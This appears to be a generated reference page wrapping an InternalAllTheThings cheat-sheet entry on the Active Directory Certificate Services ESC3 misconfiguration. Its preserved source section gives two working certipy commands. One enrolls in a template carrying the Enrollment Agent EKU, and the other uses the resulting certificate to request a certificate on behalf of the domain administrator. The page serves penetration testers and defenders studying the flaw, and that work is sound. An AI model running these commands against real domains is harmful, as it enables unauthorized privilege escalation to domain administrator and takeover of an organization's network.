---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Active Directory - Certificate ESC3

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-active-directory-ad-adcs-esc03` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/ad-adcs-esc03.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Active Directory - Certificate ESC3](../../topics/active-directory/active-directory-certificate-esc3.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-active-directory-ad-adcs-esc03 |
| name | Active Directory - Certificate ESC3 |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/active-directory/ad-adcs-esc03.md |

## Preserved Source Material

````yaml
_body: "# Active Directory - Certificate ESC3\n\n## ESC3 - Misconfigured Enrollment Agent Templates\n\n> ESC3 is when a certificate\
  \ template specifies the Certificate Request Agent EKU (Enrollment Agent). This EKU can be used to request certificates\
  \ on behalf of other users\n\n* Request a certificate based on the vulnerable certificate template ESC3.\n\n  ```ps1\n \
  \ $ certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC3'\n  [*] Saved certificate and private\
  \ key to 'john.pfx'\n  ```\n\n* Use the Certificate Request Agent certificate (-pfx) to request a certificate on behalf\
  \ of other another user\n\n  ```ps1\n  certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'User'\
  \ -on-behalf-of 'corp\\administrator' -pfx 'john.pfx'\n  ```\n\n## References"
_relative_path: active-directory/ad-adcs-esc03.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/ad-adcs-esc03.md
````
